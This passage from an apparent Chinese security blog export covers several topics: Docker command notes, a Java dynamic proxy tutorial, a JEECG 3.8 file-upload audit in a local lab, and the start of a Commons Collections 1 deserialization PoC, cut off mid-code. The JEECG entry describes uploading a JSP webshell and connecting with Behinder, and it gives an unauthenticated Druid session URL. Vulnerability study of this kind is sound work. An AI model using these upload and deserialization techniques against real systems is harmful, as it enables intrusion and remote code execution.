<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170657843-464346168.png" alt="image-20220323170657299"></p>
<p>在<code>setValue</code>处打上断点</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170721169-1610215049.png" alt="image-20220323170720926"></p>
<p>点击调式</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170809103-262640445.png" alt="image-20220323170808590"></p>
<p>进入<code>setValue</code>方法中，这里会将value值传递给<code>checkSetValue()</code>方法中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170847433-789972894.png" alt="image-20220323170847068"></p>
<p>跟进<code>checkSetValue()</code>方法，到这里已经和上面我们得出的结论一致了，它会调用对应<code>Transformer</code>实现类的<code>transform()</code>方法，这里的<code>valueTransformer</code>是在<code>TransformedMap.decorate</code>中将<code>mytransform</code>赋值给它的</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323170943956-2034361576.png" alt="image-20220323170943534"></p>
<p>跟进，就进入了我们重写的<code>transform</code>方法中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220323171354657-400333195.png" alt="image-20220323171354317"></p>
<p>以上就是一些前置知识。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap">https://www.cnblogs.com/litlife/p/12571787.html#transformedmap</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13758664.html#transformer">https://www.cnblogs.com/nice0e3/p/13758664.html#transformer</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker容器的简单使用</title>
    <url>/2022/03/15/Docker%E5%AE%B9%E5%99%A8%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="Docker基本原理及操作"><a href="#Docker基本原理及操作" class="headerlink" title="Docker基本原理及操作"></a>Docker基本原理及操作</h2><h3 id="Docker简介"><a href="#Docker简介" class="headerlink" title="Docker简介"></a>Docker简介</h3><p>Docker 使用 Google 公司推出的 Go 语言 进行开发实现，基于 Linux 内核的 cgroup，namespace，以及 AUFS 类的 Union FS 等技术，对进程进行封装隔离，属于 操作系统层面的虚拟化技术。由于隔离的进程独立于宿主和其它的隔离的进程，因此也称其为容器。最初实现是基于 LXC，从 0.7 版本以后开始去除 LXC，转而使用自行开发的 libcontainer，从 1.11 开始，则进一步演进为使用 runC 和 containerd。</p>
<span id="more"></span>

<p>Docker 在容器的基础上，进行了进一步的封装，从文件系统、网络互联到进程隔离等等，极大的简化了容器的创建和维护。使得 Docker 技术比虚拟机技术更为轻便、快捷。</p>
<h3 id="Docker下载"><a href="#Docker下载" class="headerlink" title="Docker下载"></a>Docker下载</h3><p><a href="https://download.docker.com/">https://download.docker.com/</a></p>
<h3 id="Docker的基本使用"><a href="#Docker的基本使用" class="headerlink" title="Docker的基本使用"></a>Docker的基本使用</h3><h4 id="Docker容器信息"><a href="#Docker容器信息" class="headerlink" title="Docker容器信息"></a>Docker容器信息</h4><ul>
<li>docker version #查看docker容器版本</li>
<li>docker info #查看docker容器信息</li>
<li>docker –help #查看docker容器帮助</li>
</ul>
<h4 id="镜像操作"><a href="#镜像操作" class="headerlink" title="镜像操作"></a>镜像操作</h4><ul>
<li>docker images #列出本地images</li>
<li>docker images -a #列出本地iamges（含中间映像层）</li>
<li>docker images -q #只显示镜像ID</li>
<li>docker images -qa #只显示镜像ID（含中间映像层）</li>
<li>docker images –digests #显示镜像摘要信息（DIGEST列）</li>
<li>docker images –no-trunc #显示镜像完整信息</li>
<li>docker history -H redis #显示指定镜像的历史创建；参数：-H 镜像大小和日期，默认为true；–no-trunc  显示完整的提交记录；-q  仅列出提交记录ID</li>
</ul>
<h4 id="镜像下载"><a href="#镜像下载" class="headerlink" title="镜像下载"></a>镜像下载</h4><ul>
<li>docker pull redis #下载Redis官方最新镜像，相当于：docker pull redis:latest</li>
<li>docker pull -a redis #下载仓库所有redis镜像</li>
<li>docker pull bitnami&#x2F;redis #下载私人仓库镜像</li>
</ul>
<h4 id="镜像删除"><a href="#镜像删除" class="headerlink" title="镜像删除"></a>镜像删除</h4><ul>
<li>docker rmi redis #单个镜像删除，相当于：docker rmi redis:latest</li>
<li>docker rmi -f redis #强制删除（针对镜像有运行的容器进程）</li>
<li>docker rmi -f redis tomcat nginx #多个镜像删除，不同镜像间以空格间隔</li>
<li>docker rmi -f $(docker images -q) #删除本地全部镜像</li>
</ul>
<h4 id="镜像构建"><a href="#镜像构建" class="headerlink" title="镜像构建"></a>镜像构建</h4><ul>
<li>cd &#x2F;docker&#x2F;dockerfiile, vim mycentos #编写dockerfile</li>
<li>docker build -f &#x2F;docker&#x2F;dockerfile&#x2F;mycentos -t mycentos:1.1 #构建docker镜像</li>
</ul>
<h4 id="容器操作"><a href="#容器操作" class="headerlink" title="容器操作"></a>容器操作</h4><ul>
<li>docker run -i -t –name mycentos #新建并启动容器，参数：-i  以交互模式运行容器；-t  为容器重新分配一个伪输入终端；–name  为容器指定一个名称</li>
<li>docker run -d mycentos #后台启动容器，参数：-d  已守护方式启动容器</li>
<li>docker start redis #启动一个或多个已经被停止的容器</li>
<li>docker restart redis #重启容器</li>
<li>docker top redis #列出redis容器中运行进程</li>
<li>docker logs redis #查看redis容器日志</li>
<li>docker logs -f -t –tail&#x3D;20 redis #查看redis容器日志，参数：-f  跟踪日志输出；-t   显示时间戳；–tail  仅列出最新N条容器日志</li>
<li>docker logs –since&#x3D;”2022-03-15” –tail&#x3D;10 redis #查看容器redis从2022年03月15日后的最新10条日志</li>
</ul>
<h4 id="容器的进入与退出"><a href="#容器的进入与退出" class="headerlink" title="容器的进入与退出"></a>容器的进入与退出</h4><ul>
<li>docker run -it centos &#x2F;bin&#x2F;bash #使用run方式在创建时进入</li>
<li>exit #关闭容器并退出</li>
<li>快捷键：Ctrl+P+Q #仅退出容器，不关闭</li>
<li>docker attach –sig-proxy&#x3D;false centos #直接进入centos 容器启动命令的终端，不会启动新进程，多个attach连接共享容器屏幕，参数：–sig-proxy&#x3D;false  确保CTRL-D或CTRL-C不会关闭容器</li>
<li>docker exec -i -t  centos &#x2F;bin&#x2F;bash #在 centos 容器中打开新的交互模式终端，可以启动新进程，参数：-i  即使没有附加也保持STDIN 打开；-t  分配一个伪终端</li>
<li>docker exec -i -t centos ls -l &#x2F;tmp #以交互模式在容器中执行命令，结果返回到当前终端屏幕 #以交互模式在容器中执行命令，结果返回到当前终端屏幕</li>
<li>docker exec -d centos touch cache.txt #以分离模式在容器中执行命令，程序后台运行，结果不会反馈到当前终端</li>
</ul>
<h4 id="查看容器"><a href="#查看容器" class="headerlink" title="查看容器"></a>查看容器</h4><ul>
<li>docker ps #查看正在运行的容器</li>
<li>docker ps -q #查看正在运行的容器的ID</li>
<li>docker ps -a #查看正在运行+历史运行过的容器</li>
<li>docker ps -s #显示运行容器总文件大小</li>
<li>docker ps -l #显示最近创建的容器</li>
<li>docker ps -n 3 #显示最近创建的3个容器</li>
<li>docker ps –no-trunc</li>
<li>docker inspect redis #获取redis的元信息</li>
</ul>
<h4 id="容器的停止与删除"><a href="#容器的停止与删除" class="headerlink" title="容器的停止与删除"></a>容器的停止与删除</h4><ul>
<li>docker stop redis #停止一个运行中的容器</li>
<li>docker kill redis #停止一个运行中的容器</li>
<li>docker rm redis #删除一个已停止的容器</li>
<li>docker rm -f redis #删除一个运行中的容器</li>
<li>docker rm -f $(docker ps -a -q) #删除多个容器</li>
<li>docker rm -v redis #-v 删除容器，并删除容器挂载的数据卷</li>
</ul>
<h4 id="生成镜像"><a href="#生成镜像" class="headerlink" title="生成镜像"></a>生成镜像</h4><ul>
<li>docker commit -a&#x3D;”DeepInThought” -m&#x3D;”my redis” [redis容器ID]  myredis:v1.1 #基于当前redis容器创建一个新的镜像；参数：-a 提交的镜像作者；-c 使用Dockerfile指令来创建镜像；-m :提交时的说明文字；-p :在commit时，将容器暂停</li>
</ul>
<h4 id="容器与主机间的数据拷贝"><a href="#容器与主机间的数据拷贝" class="headerlink" title="容器与主机间的数据拷贝"></a>容器与主机间的数据拷贝</h4><ul>
<li>docker cp rabbitmq:&#x2F;[container_path] [local_path] #将rabbitmq容器中的文件copy至本地路径</li>
<li>docker cp [local_path] rabbitmq:&#x2F;[container_path]&#x2F; #将主机文件copy至rabbitmq容器</li>
<li>docker cp [local_path] rabbitmq:&#x2F;[container_path] #将主机文件copy至rabbitmq容器，目录重命名为[container_path]（注意与非重命名copy的区别）</li>
</ul>
<h2 id="Docker-compose的基本使用"><a href="#Docker-compose的基本使用" class="headerlink" title="Docker-compose的基本使用"></a>Docker-compose的基本使用</h2><blockquote>
<p>Docker-Compose项目是Docker官方的开源项目，负责实现对Docker容器集群的快速编排。</p>
</blockquote>
<p>常用命令</p>
<ul>
<li>docker-compose 命令 –help  #获得一个命令的帮助</li>
<li>docker-compose up -d nginx  #构建启动nignx容器</li>
<li>docker-compose exec nginx bash  #登录到nginx容器中</li>
<li>docker-compose down  #此命令将会停止 up 命令所启动的容器，并移除网络</li>
<li>docker-compose ps  #列出项目中目前的所有容器</li>
<li>docker-compose restart nginx  #重新启动nginx容器</li>
<li>docker-compose build nginx  #构建镜像 </li>
<li>docker-compose build –no-cache nginx  #不带缓存的构建</li>
<li>docker-compose to  #查看各个服务容器内运行的进程 </li>
<li>docker-compose logs -f nginx  #查看nginx的实时日志</li>
<li>docker-compose images  #列出 Compose 文件包含的镜像</li>
<li>docker-compose config  # 验证文件配置，当配置正确时，不输出任何内容，当文件配置错误，输出错误信息。 </li>
<li>docker-compose events –json nginx  #以json的形式输出nginx的docker日志</li>
<li>docker-compose pause nginx  #暂停nignx容器</li>
<li>docker-compose unpause nginx  #恢复ningx容器</li>
<li>docker-compose rm nginx  #删除容器（删除前必须关闭容器，执行stop）</li>
<li>docker-compose stop nginx  #停止nignx容器</li>
<li>docker-compose start nginx  #启动nignx容器</li>
<li>docker-compose restart nginx  #重启项目中的nignx容器</li>
<li>docker-compose run –no-deps –rm php-fpm php -v  #在php-fpm中不启动关联容器，并容器执行php -v 执行完成后删除容器</li>
</ul>
]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Docker-compose</tag>
      </tags>
  </entry>
  <entry>
    <title>JEECG代码审计之文件上传</title>
    <url>/2022/03/21/JEECG%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>JEECG（J2EE Code Generation）是一款基于代码生成器JEE的智能开发平台。引领新的开发模式(Online Coding-&gt;代码生成器-&gt;手工MERGE智能开发)，可以帮助解决Java项目90%的重复工作，让开发更多关注业务逻辑。既能快速提高开发效率，帮助公司节省人力成本，同时又不失灵活性。</p>
<span id="more"></span>

<p>采用SpringMVC + Hibernate + Minidao(类Mybatis) + Easyui(UI库)+ Jquery + Boostrap + Ehcache + Redis + Ztree + Vue + Boostrap-table + ElementUI等基础架构</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
<li>mysql5.7</li>
<li>IDEA</li>
<li>jdk1.8</li>
<li>navicat</li>
<li>tomcat8</li>
<li>jeecg3.8：<a href="https://github.com/chen-tj/jeecg3.8">https://github.com/chen-tj/jeecg3.8</a></li>
</ul>
<p>下载源码，导入IDEA，刷新maven</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321230716606-1233901893.png" alt="image-20220321230716028"></p>
<p>创建jeecg数据库，修改数据库配置文件</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321230803568-2109007214.png" alt="image-20220321230803872"></p>
<p>navicat导入sql文件</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321232942735-373122190.png" alt="image-20220321232942517"></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321233013717-1571466095.png" alt="image-20220321233012479"></p>
<p>配置tomcat8启动，试了tomcat9发现报错</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321234119767-1206559945.png" alt="image-20220321234119733"></p>
<p>启动完成后，访问<a href="http://localhost:8080/jeecg_war_exploded/loginController.do?login">http://localhost:8080/jeecg_war_exploded/loginController.do?login</a></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220321234044205-332817464.png" alt="image-20220321234043921"></p>
<h2 id="路由简介"><a href="#路由简介" class="headerlink" title="路由简介"></a>路由简介</h2><p>JEECG快速开发平台基于spring MVC 框架，以下就是常见的注解：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一、组件型注解：</span><br><span class="line">@Component：在类定义之前添加@Component注解，他会被spring容器识别，并转为bean。</span><br><span class="line">@Repository：对Dao实现类进行注解 (特殊的@Component)</span><br><span class="line">@Service：用于对业务逻辑层进行注解， (特殊的@Component)</span><br><span class="line">@Controller：用于控制层注解 ， (特殊的@Component)</span><br><span class="line">以上四种注解都是注解在类上的，被注解的类将被spring初始话为一个bean，然后统一管理。</span><br><span class="line">二、请求和参数型注解：</span><br><span class="line">@RequestMapping：用于处理请求地址映射，可以作用于类和方法上。</span><br><span class="line">	value：定义request请求的映射地址</span><br><span class="line">	method：定义地request址请求的方式，包括【GET, POST, DELETE ...】默认接受get请求，如果请求方式和定义的方式不一样则请求无法成功。</span><br><span class="line">	params：定义request请求中必须包含的参数值。</span><br><span class="line">	headers：定义request请求中必须包含某些指定的请求头，如：RequestMapping(value = &quot;/something&quot;, headers = &quot;content-type=text/*&quot;)说明请求中必须要包含&quot;text/html&quot;, &quot;text/plain&quot;这中类型的Content-type头，才是一个匹配的请求。</span><br><span class="line">	consumes：定义请求提交内容的类型。</span><br><span class="line">	produces：指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回</span><br><span class="line">@RequestParam：用于获取传入参数的值</span><br><span class="line">	value：参数的名称</span><br><span class="line">	required：定义该传入参数是否必须，默认为true，（和@RequestMapping的params属性有点类似）</span><br><span class="line">@PathViriable：用于定义路径参数值</span><br><span class="line">	value：参数的名称</span><br><span class="line">	required：定义传入参数是否为必须值</span><br><span class="line">@ResponseBody：作用于方法上，可以将整个返回结果以某种格式返回，如json或xml格式。</span><br><span class="line">@CookieValue：用于获取请求的Cookie值</span><br><span class="line">@ModelAttribute：用于把参数保存到model中，可以注解方法或参数，注解在方法上的时候，该方法将在处理器方法执行之前执行，然后把返回的对象存放在 session（前提时要有@SessionAttributes注解） 或模型属性中，@ModelAttribute(“attributeName”) 在标记方法的时候指定，若未指定，则使用返回类型的类名称（首字母小写）作为属性名称</span><br><span class="line">@SessionAttributes：可以使得模型中的数据存储一份到session域中。配合@ModelAttribute(&quot;user&quot;)使用的时候,会将对应的名称的model值存到session中</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>登陆后台后，访问：<a href="http://localhost:8080/jeecg_war_exploded/jeecgFormDemoController.do?commonUpload">http://localhost:8080/jeecg_war_exploded/jeecgFormDemoController.do?commonUpload</a></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322012447332-349201622.png" alt="image-20220322012447636"></p>
<p>上传文件，抓包改名</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322013904705-1361042337.png" alt="image-20220322013904920"></p>
<p>冰蝎连接成功</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322013928618-3762562.png" alt="image-20220322013928988"></p>
<p>这里还存在一个未授权访问的漏洞</p>
<p><a href="http://localhost:8080/jeecg_war_exploded/webpage/system/druid/websession.json">http://localhost:8080/jeecg_war_exploded/webpage/system/druid/websession.json</a></p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020826940-1411269063.png" alt="image-20220322020827359"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>通过url地址<a href="http://127.0.0.1:8080/jeecg_war_exploded/cgUploadController.do?ajaxSaveFile&amp;sessionId=%E5%AF%BB%E6%89%BE%E6%8E%A7%E5%88%B6%E5%99%A8%EF%BC%8C%E5%85%A8%E5%B1%80%E6%90%9C%E7%B4%A2%60@RequestMapping(&quot;/cgUploadController&quot;)%60">http://127.0.0.1:8080/jeecg_war_exploded/cgUploadController.do?ajaxSaveFile&amp;sessionId=寻找控制器，全局搜索`@RequestMapping(&quot;/cgUploadController&quot;)`</a></p>
<p>定位<code>\src\main\java\org\jeecgframework\web\cgform\controller\upload\CgUploadController.java</code>，在<code>cgUploadController.do</code>后面还跟了参数<code>ajaxSaveFile</code>，我们当前这个<code>CgUploadController.java</code>中搜索<code>ajaxSaveFile</code>，定位到如下代码：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015102312-1853945584.png" alt="image-20220322015102321"></p>
<p>可以看到上传文件没有判断文件名后缀，直接调用<code>write2Disk</code>函数</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015441385-3605746.png" alt="image-20220322015441618"></p>
<p>看下<code>write2Disk</code>函数，改函数传递三个参数，第一个为文件对象，第二个为文件拓展名，第三个为文件保存的路径，函数首先判断<code>extend</code>也就是拓展名是不是txt</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015718001-648888386.png" alt="image-20220322015717181"></p>
<p>因为这里我们上传的是jsp，所以走的是else语句，代码如下：</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322015847500-798806028.png" alt="image-20220322015847752"></p>
<p>直接调用<code>FileCopyUtils#copy</code>方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FileCopyUtils.copy(mf.getBytes(), savefile);</span><br></pre></td></tr></table></figure>

<p>继续跟进<code>copy</code>函数，代码的意思是将文件的二进制数组转换成字节数组输入流，然后定义一个输出流<code>outStream</code>，将两个当做参数调用另一个copy方法</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020047955-320794890.png" alt="image-20220322020048358"></p>
<p>看到这个copy函数的代码，就很明显了，就是将文件输入流中的内容拷贝到输出流中，也就是将上传的文件保存到指定的路径中</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020419713-1082894079.png" alt="image-20220322020420167"></p>
<p>接着往下</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020629867-522980796.png" alt="image-20220322020630209"></p>
<p>最后跟进到这个copy方法中，完成输入流到输出流的拷贝</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202203/1993367-20220322020653035-220191673.png" alt="image-20220322020653434"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s/mV4GNI9O4a1pT3ve3Mt75Q">https://mp.weixin.qq.com/s/mV4GNI9O4a1pT3ve3Mt75Q</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>Java动态代理</title>
    <url>/2022/04/25/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h3><p>为其他对象提供一个代理以控制对某个对象的访问。代理类主要负责为委托了（真实对象）预处理消息、过滤消息、传递消息给委托类，代理类不现实具体服务，而是利用委托类来完成服务，并将执行结果封装处理。</p>
<span id="more"></span>

<h3 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h3><p>创建一个接口，然后创建被代理的类实现该接口并且实现该接口中的抽象方法。之后再创建一个代理类，同时使其也实现这个接口。在代理类中持有一个被代理对象的引用，而后在代理类方法中调用该对象的方法。</p>
<p>接口：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title">HelloInterface</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sayHello</span>()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>被代理类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello proxy!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代理类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloProxy</span> <span class="keyword">implements</span> <span class="title class_">HelloInterface</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">HelloInterface</span> <span class="variable">helloInterface</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sayHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Before invoke sayHello&quot;</span> );</span><br><span class="line">        helloInterface.sayHello();</span><br><span class="line">        System.out.println(<span class="string">&quot;After invoke sayHello&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代理类调用：<br> 被代理类被传递给了代理类<code>HelloProxy</code>，代理类在执行具体方法时通过所持用的被代理类完成调用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="type">static</span> <span class="type">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        HelloProxy helloProxy = <span class="keyword">new</span> <span class="built_in">HelloProxy</span>();</span><br><span class="line">        helloProxy.<span class="built_in">sayHello</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">输出：</span><br><span class="line">Before invoke sayHello</span><br><span class="line">Hello proxy!</span><br><span class="line">After invoke sayHello</span><br></pre></td></tr></table></figure>

<p>使用静态代理很容易就完成了对一个类的代理操作。但是静态代理的缺点也暴露了出来：由于代理只能为一个类服务，如果需要代理的类很多，那么就需要编写大量的代理类，比较繁琐。</p>
<h3 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h3><p>利用反射机制在运行时创建代理类。接口、被代理类不变，我们构建一个<code>handler</code>类来实现<code>InvocationHandler</code>接口。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import proxy.UserService;</span><br><span class="line">import proxy.UserServiceImpl;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line">public class Client2 &#123;</span><br><span class="line">    public static void main(String[] args) throws IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        // 设置变量可以保存动态代理类，默认名称以 $Proxy0 格式命名</span><br><span class="line">       //System.getProperties().setProperty(&quot;sun.misc.ProxyGenerator.saveGeneratedFiles&quot;, &quot;true&quot;);</span><br><span class="line">        // 1. 创建被代理的对象，UserService接口的实现类</span><br><span class="line">        HelloInterface hello = new Hello();</span><br><span class="line">        // 2. 获取对应的 ClassLoader</span><br><span class="line">        ClassLoader classLoader = userServiceImpl.getClass().getClassLoader();</span><br><span class="line">        // 3. 获取所有接口的Class，这里的UserServiceImpl只实现了一个接口UserService，</span><br><span class="line">        Class[] interfaces = hello.getClass().getInterfaces();</span><br><span class="line">        // 4. 创建一个将传给代理类的调用请求处理器，处理所有的代理对象上的方法调用</span><br><span class="line">        //     这里创建的是一个自定义的处理器，须传入实际的执行对象 hello</span><br><span class="line">        InvocationHandler helloHandler = new HelloHandler(hello);</span><br><span class="line">        /*</span><br><span class="line">		   5.根据上面提供的信息，创建代理对象 在这个过程中，</span><br><span class="line">               a.JDK会通过根据传入的参数信息动态地在内存中创建和.class 文件等同的字节码</span><br><span class="line">               b.然后根据相应的字节码转换成对应的class，</span><br><span class="line">               c.然后调用newInstance()创建代理实例</span><br><span class="line">		 */</span><br><span class="line">        HelloInterface proxy = (HelloInterface) Proxy.newProxyInstance(classLoader, interfaces, helloHandler);</span><br><span class="line">        // 调用代理的方法</span><br><span class="line">        proxy.sayHello();</span><br><span class="line">        // 保存JDK动态代理生成的代理类，类名保存为 HelloProxy</span><br><span class="line">        // ProxyUtils.generateClassFile(proxy.getClass(), &quot;HelloProxy&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220425143320115-109776722.png" alt="image-20220425143318908"></p>
<p><code>InvocationHandler</code>和<code>Proxy</code>的主要方法有</p>
<p><strong>java.lang.reflect.InvocationHandler</strong></p>
<p><code>Object invoke(Object proxy, Method method, Object[] args)</code>定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用</p>
<p><strong>java.lang.reflect.Proxy</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static InvocationHandler getInvocationHandler(Object proxy)用于获取指定代理对象所关联的调用处理器</span><br><span class="line"></span><br><span class="line">static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces)返回指定接口的代理类</span><br><span class="line"></span><br><span class="line">static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h) 构造实现指定接口的代理类的一个新实例，所有方法会调用给定处理器对象的 invoke 方法</span><br><span class="line"></span><br><span class="line">static boolean isProxyClass(Class&lt;?&gt; cl)返回 cl 是否为一个代理类</span><br></pre></td></tr></table></figure>

<p>动态代理具体步骤：</p>
<ol>
<li>通过实现 <code>InvocationHandler</code> 接口创建自己的调用处理器；</li>
<li>通过为 Proxy 类指定 <code>ClassLoader</code> 对象和一组 interface 来创建动态代理类；</li>
<li>通过反射机制获得动态代理类的构造函数，其唯一参数类型是调用处理器接口类型；</li>
<li>通过构造函数创建动态代理类实例，构造时调用处理器对象作为参数被传入。</li>
<li>调用方法的时候通过 <code>super.h.invoke(this, m1, (Object[])null);</code> 调用，其中的 <code>super.h.invoke</code> 实际上是在创建代理的时候传递给 <code>Proxy.newProxyInstance</code> 的 <code>Handler</code> 对象，它继承 <code>InvocationHandler</code> 类，负责实际的调用处理逻辑。</li>
<li><code>Handler</code> 的 <code>invoke</code> 方法接收到 method、args 等参数后，进行一些处理，然后通过反射让被代理的对象 target 执行方法。</li>
</ol>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809">https://zhuanlan.zhihu.com/p/347141071?msclkid=0fbfe08dc46311ecae26c4e44894f809</a></p>
<p><a href="https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118">https://www.jianshu.com/p/9bcac608c714?msclkid=b40c8c68c44511ecb19300522d8d7118</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections1分析（一）</title>
    <url>/2022/03/31/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections1%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在CC链的前置基础学习完后，就可以开始学习CC链的具体执行流程。</p>
<span id="more"></span>

<h3 id="CC链分析"><a href="#CC链分析" class="headerlink" title="CC链分析"></a>CC链分析</h3><p>先来看下poc代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import org.apache.commons.collections.*;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span><br><span class="line">        Transformer[] transformers = new Transformer[] &#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new 